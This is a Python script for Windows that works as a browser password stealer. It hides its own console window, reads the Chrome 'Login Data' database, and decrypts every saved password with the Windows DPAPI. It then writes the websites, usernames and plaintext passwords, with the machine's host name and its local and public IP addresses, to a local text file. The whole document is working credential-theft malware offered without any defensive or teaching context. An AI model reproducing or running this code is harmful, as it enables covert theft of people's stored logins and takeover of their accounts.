from os import getenv
import sqlite3
import win32crypt
import win32console
import win32gui
import socket
from requests import get

window = win32console.GetConsoleWindow()
win32gui.ShowWindow(window, 0)#makes console but does not show the window

conn = sqlite3.connect(getenv("APPDATA")+r"\..\Local\Google\Chrome\User Data\Default\Login Data")#goes to folder where chrome passwords are saved
cursor = conn.cursor() 
name = socket.gethostname()#gets the name of PC
localIP = socket.gethostbyname(name)#gets the inside local ip address
globalIP = get("https://api.ipify.org").text #gets the outside local (global) ip address


cursor.execute("Select action_url, username_value, password_value FROM logins") #gets the username password and websites from the file
fp = open(r"file.txt", "a+")#creates a new file in the location this program is ran from
fp.write("\n Host: " + name)#writes the name of PC to the file
fp.write("\n Local: " + localIP)#writes the inside local ip address to the file
fp.write("\n Global: " + globalIP)#writes the outside local (global) ip address to the file
fp.write("\n")#creates a break in the lines

for result in cursor.fetchall():#pulls the encrypted info from line 19
    password = win32crypt.CryptUnprotectData(result[2],None,None,None,0)[1]#decrypts the info from line 19 using the windows login info it is encrypted with
    if password:#writes the passwords as long as there is passwords to write
        fp.write("\n The website is " + result[0])#writes the website the password is saved to
        fp.write("\n The Username is " + result[1])#writes the username saved to the login
        fp.write("\n The password is " + str(password.decode("utf-8")))#writes the password after it is decrypted for the last time
        fp.write("\n")
        
fp.write("\n")#writes lines it is clearly shown when 1 entry ends and the other starts
fp.write("\n")
fp.write("\n")
fp.write("\n")
fp.write("\n")
fp.write("\n")
fp.write("\n")
fp.write("\n")
fp.write("\n")
fp.write("\n")
fp.write("\n")
fp.write("\n")
fp.write("\n")
fp.write("\n")
fp.write("\n")
fp.write("\n")

